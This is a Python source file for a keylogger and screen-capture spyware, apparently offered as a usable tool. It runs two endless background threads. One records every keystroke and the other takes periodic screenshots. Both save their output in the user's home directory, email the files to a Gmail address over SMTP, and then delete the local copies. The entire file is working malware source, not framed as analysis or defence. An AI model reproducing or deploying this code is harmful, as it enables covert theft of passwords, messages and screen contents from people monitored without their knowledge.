# Taking Screenshot and save it.
# saving keystrokes type by the user and save in the text file.
# Send these save things via email
import keyboard
import json
import time
import os
import threading
import smtplib 
import pyscreenshot
from datetime import datetime
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 


def Sending_via_gmail(file_list):
    fromaddr = "from@gmail.com"
    toaddr = "to@gmail.com"

    # Create MIMEMultipart message
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Subject of the Mail"
    body = "Attached are the requested files."
    
    # Attach email body
    msg.attach(MIMEText(body, 'plain'))

    # Attach multiple files
    for file_name, file_path in file_list:
        try:
            with open(file_path, "rb") as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())

            # Encode into base64
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={file_name}")
            
            # Attach file to email
            msg.attach(p)
        except Exception as e:
            print(f"Error attaching {file_name}: {e}")

    # Create SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()  # Start TLS encryption

    s.login(fromaddr, "password")  # Use App Password for Gmail

    # Convert the message to a string and send
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)

    # Close the SMTP session
    s.quit()

    print("Email sent successfully!")

def Taking_Screen_Shot(Run_time=0.40,Time_delay=10):

    # This loop run infinitely with caputring and sending data after certain Recording time
    while True:

        # Time for adding in the name of the file
        Recording_timing = time.time() + 60*Run_time # 60s*15=900seconds (15 minutes) adds to current time  
        image_names = {"FIlE_NAMES":[],"FILE_PATHS":[]}

        # this while loop save data for certain time ( sending_time )        
        while time.time()<Recording_timing:
            home_directory = os.path.expanduser('~')
            Time = datetime.now().strftime("%Y-%m-%d-%H-%M-%S-%p")  # decide time for one file 

            # Adding delay to capture screenshot after certain delay
            time.sleep(Time_delay)

            # pyscreenshot.grab() is used to capture a screenshot
            image = pyscreenshot.grab()

            # Creating a file in home directory with a name+time+extension
            FILE_NAME_With_Extension = f"image_{Time}.png"
            FILE_PATH = os.path.join(home_directory, FILE_NAME_With_Extension)
            image.save(FILE_PATH)
            image_names["FIlE_NAMES"].append(FILE_NAME_With_Extension)
            image_names["FILE_PATHS"].append(FILE_PATH)

        # convert the dictionary data into a tuples where ("file name", "file extension",.....)
        file_list = list(zip(image_names["FIlE_NAMES"],image_names["FILE_PATHS"]))

        # function to send file via gmail
        Sending_via_gmail(file_list)

        # After sending the files via gmail delete the files from the home directory
        for file in image_names["FILE_PATHS"]:
            try:
                os.remove(file)
            except Exception as e:
                print(f"Error deleting {file}:{e}")

def Taking_keys_from_clipboard(Run_time=0.50):

    # ----> This loop run for infinite time
    while True:
        home_directory = os.path.expanduser("~")
        text_FIle = {"TEXT_FILE_Name": "", "TEXT_FILE_PATH": ""}
        Recording_timing = time.time() + 60 * Run_time              # decide time for one file 
        Time = datetime.now().strftime("%Y-%m-%d-%H-%M-%S-%p") # Time for adding in the name of the file
        
        # Create a single file for the entire duration
        Text_FILE_NAME_WITH_EXTENSION = f"text_{Time}.txt"
        Text_FILE_PATH = os.path.join(home_directory, Text_FILE_NAME_WITH_EXTENSION)
        text_FIle['TEXT_FILE_Name'] = Text_FILE_NAME_WITH_EXTENSION
        text_FIle['TEXT_FILE_PATH'] = Text_FILE_PATH
        

        # ----> Record the file for certain amount of time in a file
        with open(Text_FILE_PATH, "a") as file:

            # ----> This loop runs for a certain amount of time, save the data in that file 
            while time.time() < Recording_timing:  
                start = keyboard.record(until="enter")
                for r in start:
                    data = r.to_json() + "\n"
                    file.write(data)

        # Send the file via email ( function )
        Sending_via_gmail([(text_FIle['TEXT_FILE_Name'], text_FIle['TEXT_FILE_PATH'])])

        # Delete the file after sending
        try:
            file = text_FIle['TEXT_FILE_PATH']
            os.remove(file)
        except Exception as e:
            print(f"Error deleting {text_FIle['TEXT_FILE_PATH']}: {e}")


thread1 = threading.Thread(target=Taking_Screen_Shot)
thread1.daemon = True
thread1.start()

thread2 = threading.Thread(target=Taking_keys_from_clipboard)
thread2.daemon = True
thread2.start()

thread1.join()
thread2.join()